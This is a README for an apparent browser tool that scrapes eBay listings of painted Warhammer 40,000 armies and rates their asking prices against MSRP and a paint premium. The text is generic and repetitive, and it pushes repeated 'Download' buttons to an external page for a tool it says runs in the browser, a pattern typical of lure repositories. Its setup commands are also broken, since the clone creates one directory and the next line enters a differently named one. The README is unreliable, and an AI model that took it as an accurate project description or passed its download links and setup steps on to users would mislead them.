# 40K Painted Army Value Scorecard v2026 - Browser eBay Data Scraper and Viewer 2026

> **40K Painted Army Value Scorecard** is a web browser tool for Warhammer 40,000 hobbyists. It collects painted army listings from eBay, compares them with MSRP estimates and paint-premium factors, and displays the findings in a sortable 2026 scorecard.

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millerbrandonsyai5168/40k-painted-army-viewer?style=flat-square)](https://github.com/millerbrandonsyai5168/40k-painted-army-viewer)

---

<p align="center">
  <a href="https://millerbrandonsyai5168.github.io/40k-painted-army-viewer/">
    <img src="https://img.shields.io/badge/Download-40K%20Painted%20Army%20Value%20Scorecard%20Latest-brightgreen?style=for-the-badge" alt="Download 40K Painted Army Value Scorecard">
  </a>
</p>

> **[Download 40K Painted Army Value Scorecard v2026](https://millerbrandonsyai5168.github.io/40k-painted-army-viewer/)**

---

[Download Latest Build](https://millerbrandonsyai5168.github.io/40k-painted-army-viewer/)

---

## Overview

40K Painted Army Value Scorecard turns painted Warhammer 40,000 army offers from eBay into an organized comparison view. Listing information is collected and presented alongside estimated MSRP and an applied paint premium, helping users assess asking prices more consistently.

The browser-based project supports sorting, filtering, and faction-by-faction offer comparisons. It can also produce cleaned JSON or JavaScript output, and its standalone HTML viewer lets users examine scorecard results without installing a separate application.

---

## What It Provides

- Gather current painted army listings from eBay
- Compare listing prices with estimated MSRP
- Include paint-premium calculations in value scores
- Export normalized listing data as JSON
- Create JavaScript data for the viewer
- Display results through a standalone HTML scorecard
- Sort and filter listings for more targeted analysis
- Compare offers between Warhammer 40,000 factions

---

## Getting Started

First, clone the repository and enter its project directory:

```bash
git clone https://github.com/millerbrandonsyai5168/40k-painted-army-viewer.git
cd 40k-painted-army-data-viewer
```

The application runs in a modern web browser. Open the supplied HTML viewer directly, or use a basic local web server if your browser blocks resources loaded from local files.

You can also use the hosted build:

[Download 40K Painted Army Value Scorecard](https://millerbrandonsyai5168.github.io/40k-painted-army-viewer/)

---

## Using the Scorecard

Follow this general process:

1. Launch the browser-based scorecard.
2. Browse the painted army listings gathered from eBay.
3. Sort entries using the available scorecard fields.
4. Apply filters to reduce the set of results.
5. Compare estimated values based on MSRP and paint-premium calculations.
6. Examine offers by Warhammer 40,000 faction.
7. Export or reuse the cleaned JSON and JavaScript data as required.

For local use, open the standalone HTML viewer after cloning the repository. The generated data can be loaded by the viewer using the files supplied with the build.

---

## Data and Configuration

The standalone HTML viewer receives listing information through JavaScript data and cleaned JSON output.

The repository contains the source data and viewer configuration. To change what the scorecard displays, edit the appropriate JSON or JavaScript data file and reload the HTML viewer. Keep listing records, faction details, MSRP comparisons, and paint-premium values in the format used by the project.

---

## Requirements

- A current web browser
- Internet access for collecting live eBay listings
- Enough local storage for the repository and generated data files
- JavaScript enabled
- A local web server when browser file restrictions stop the viewer from loading its data

---

## Frequently Asked Questions

### What information does the scorecard assess?

The tool evaluates painted Warhammer 40,000 army listings by comparing them with MSRP and applying a paint-premium factor.

### Is faction comparison supported?

Yes. Listings can be compared by faction, as well as sorted and filtered using the viewer's available controls.

### Which data exports does the project create?

It generates cleaned JSON and JavaScript data that can be used by the standalone HTML viewer or in other compatible workflows.

### Where can I find the newest build?

Use the hosted download link near the beginning of this README, or check the project repository for the current build.

### Why does the local HTML viewer fail to load data?

Certain browsers restrict access to resources referenced by local files. Start a simple local web server in the repository directory, then open the viewer through the server's local address.

### Where is the viewer configuration kept?

Data and viewer-related settings are stored in the repository's JSON and JavaScript files. Inspect and edit those files to change the information shown in the scorecard.

### Does a scorecard result confirm the true value of a listing?

No. The scorecard is a comparison aid based on its MSRP and paint-premium calculations. Each eBay listing and its individual details should be reviewed separately.

---

## Future Work

- Further refine painted army value comparisons
- Make faction result browsing more effective
- Enhance sorting and filtering workflows
- Broaden JSON and JavaScript data handling
- Continue maintaining the 2026 browser-based scorecard format

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
